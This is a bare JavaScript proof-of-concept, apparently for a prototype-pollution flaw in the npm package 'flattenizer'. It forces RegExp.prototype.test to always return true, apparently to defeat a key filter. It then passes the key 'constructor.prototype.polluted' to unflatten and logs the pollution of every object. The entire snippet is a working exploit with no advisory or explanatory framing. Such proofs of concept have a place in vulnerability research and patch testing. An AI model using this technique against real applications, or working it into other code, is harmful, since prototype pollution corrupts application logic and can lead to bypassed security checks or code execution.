RegExp.prototype.test = () => true;
console.log({}.polluted);
const flattenizer = require('flattenizer');
flattenizer.unflatten({ 'constructor.prototype.polluted': 'yes' });
console.log({}.polluted);